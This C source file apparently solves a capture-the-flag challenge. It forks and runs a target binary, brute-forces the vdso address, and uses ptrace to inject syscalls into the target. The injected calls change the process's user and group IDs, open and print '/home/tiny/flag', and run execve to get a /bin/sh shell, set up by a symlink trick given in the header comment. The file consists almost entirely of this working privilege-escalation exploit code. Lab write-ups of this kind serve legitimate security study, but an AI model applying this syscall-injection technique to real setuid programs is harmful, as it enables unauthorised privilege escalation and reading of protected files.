/* Compile: * gcc pt.c -m32 -o pt -g * Run:
 * ln -s /bin/sh `printf "\x1c\x00"`
 * (cat) | ./pt
*/
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <errno.h>

void main();

// argv[0] = p32(0xf7725b57) - __kernel_vsyscall in vdso
// length 26 - ptrace() syscall number in eax
char * args[] = {"P[r\xf7", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a", "a"};
struct user_regs_struct regs = { 0 };

int pt_syscall(pid_t pid, int num, int arg0, int arg1, int arg2, int arg3, int arg4, int arg5)
{
    ptrace(PTRACE_GETREGS, pid, 0, &regs);
    regs.eax = num;
    regs.ebx = arg0; 
    regs.ecx = arg1; // argv
    regs.edx = arg2; // envp
    regs.esi = arg3;
    regs.edi = arg4;
    regs.ebp = arg5;
    regs.eip = 0xf7725b57; // __kernel_vsyscall in vdso
    ptrace(PTRACE_SETREGS, pid, 0, &regs);
    ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
    wait(NULL);
    ptrace(PTRACE_GETREGS, pid, 0, &regs);
    printf("eip: %p\n", regs.eip);
    printf("eax: %ld\n", regs.eax);
//    int res = regs.eax;
    return regs.eax;
}

void syscall_execve(pid_t pid){
    puts("execve()");
    pt_syscall(pid, 11, 0xf7725b7b, 0, 0, 0, 0, 0); // ln -s /bin/sh `printf "\x1c\x00"`
}

void syscall_setuid(pid_t pid)
{
    puts("setgid");
    pt_syscall(pid, 0x17, 1077, 0, 0, 0, 0, 0);
}

void syscall_setgid(pid_t pid)
{
    puts("setgid");
    pt_syscall(pid, 0x2e, 1077, 0, 0, 0, 0, 0);
}

void syscall_setreuid(pid_t pid)
{
    puts("setreuid");
    pt_syscall(pid, 0x46, 1077, 1077, 0, 0, 0, 0);
}

void syscall_setregid(pid_t pid)
{
    puts("setregid");
    pt_syscall(pid, 0x47, 1077, 1077, 0, 0, 0, 0);
}

void syscall_getuid(pid_t pid){
    puts("getuid");
    pt_syscall(pid, 0x18, 0, 0, 0, 0, 0, 0);
}

void syscall_getgid(pid_t pid){
    puts("getgid");
    pt_syscall(pid, 0x2f, 0, 0, 0, 0, 0, 0);
}

void syscall_geteuid(pid_t pid){
    puts("geteuid");
    pt_syscall(pid, 0x31, 0, 0, 0, 0, 0, 0);
}

void syscall_getegid(pid_t pid){
    puts("getegid");
    pt_syscall(pid, 0x32, 0, 0, 0, 0, 0, 0);
}

void set_ids(pid_t pid){
    syscall_setuid(pid);
    syscall_setgid(pid);
    syscall_setreuid(pid);
    syscall_setregid(pid);
}

void get_ids(pid_t pid){
    syscall_getuid(pid);
    syscall_getgid(pid);
    syscall_geteuid(pid);
    syscall_getegid(pid);
}

 unsigned int remote_read_buf = 0x8048180;
 unsigned int remote_path = 0x8048080;

 void my_sys_mprotect(pid_t pid) {
     puts("mprotect");
     pt_syscall(pid, 0x7d, 0x8048000, 0x1000, 7, 0, 0, 0);
 }

 int my_sys_open(pid_t pid) {
     puts("open");
     int fd = pt_syscall(pid, 0x5, remote_path, 0, 0, 0, 0, 0);
     if (fd < 0) {
         printf("open failed: %s\n", strerror(errno));
     }
     return fd;
 }

 int my_sys_read(pid_t pid, int fd) {
     puts("read");
     return pt_syscall(pid, 0x3, fd, remote_read_buf, 0x100, 0, 0, 0);
 }

 int my_sys_write(pid_t pid, int bytes2write) {
     puts("write");
     pt_syscall(pid, 0x4, 1, remote_read_buf, bytes2write, 0, 0, 0);
 }

 void catflag(pid_t pid) {
     char path[] = {"/home/tiny/flag"};
     char path_read[sizeof(path)+1] = {0};
     my_sys_mprotect(pid);
     puts("start poker to the child...");
//    ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
 //   wait(NULL);
     for (int i = 0; i < sizeof(path) / sizeof(int); ++i) {
	 printf("write %#x into remote %#x\n", ((int*)path)[i], remote_path+i*4);
         if (-1 == ptrace(PTRACE_POKETEXT, pid, remote_path+i*sizeof(int), ((int*)path)[i])) {
		printf("poker path failed: %s\n", strerror(errno));
	 }
     }
//    ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
 //   wait(NULL);
     for (int i = 0; i < sizeof(path) / sizeof(int); ++i) {
         if (-1 == (*(int*)(path_read+4*i) = ptrace(PTRACE_PEEKTEXT, pid, remote_path+i*sizeof(int), 0))) {
		printf("peak path failed: %s\n", strerror(errno));
	 }
     }
     printf("read path:%s\nIn hex: %#x, %#x, %#x %#x\n"
	, path_read
	, *(int*)path_read
	, *(int*)(path_read+4)
	, *(int*)(path_read+8)
	, *(int*)(path_read+12)
	);

     //wait(NULL);
     int fd = my_sys_open(pid);
     if (fd > 0) {
         int bytes_read = my_sys_read(pid, fd);
         my_sys_write(pid, bytes_read);
     }
 }

void pwnage(pid_t pid)
{
    wait(NULL);
    int success = ptrace(PTRACE_GETREGS, pid, 0, &regs);
    if (success == -1)
    {
        main(); // brute force vdso addr
    }
    else{
        printf("eip: %p\n", regs.eip);
        // syscall execve("sh", 0, 0)
        set_ids(pid);
        get_ids(pid);
        catflag(pid);
        syscall_execve(pid);
        ptrace(PTRACE_CONT, pid, 0, 0);
        wait(NULL);
    }
}

void main()
{
    pid_t pid = fork();

    if (0 == pid) // child
    {
//        execve("/home/tiny_hard/tiny_hard", args, 0);
        execve("/home/tiny/tiny", args, 0);
        perror("execve");
    }
    else // parent
    {
        pwnage(pid);
    }
}
